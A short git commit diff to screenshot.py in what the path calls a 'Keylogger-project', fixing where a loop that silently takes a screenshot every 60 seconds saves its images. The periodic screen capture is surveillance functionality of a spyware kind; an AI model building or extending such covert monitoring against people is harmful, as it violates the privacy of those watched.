68cb1d068ba45c8f442c299abfa06866a38a92ba
Nithishdking <nithishdking@gmail.com>
2024-08-14 16:37:40 +0530

    Output

--- screenshot.py
+++ screenshot.py
@@ -5,11 +5,11 @@ import threading
 import os
 
 def capture_screenshot():
-    save_path = "D:\Keylogger-project\screenshot"  # Change this to your desired directory
+    save_path = "D:/Keylogger-project/screenshot/"  # Change this to your desired directory
     os.makedirs(save_path, exist_ok=True)  # Create directory if it doesn't exist
     while True:
         screenshot = pyautogui.screenshot()
-        screenshot.save(f"screenshot_{int(time.time())}.png")
+        screenshot.save(f"{save_path}screenshot_{int(time.time())}.png")
         time.sleep(60)  # Capture every 60 seconds
 
 def start_screenshot_thread():
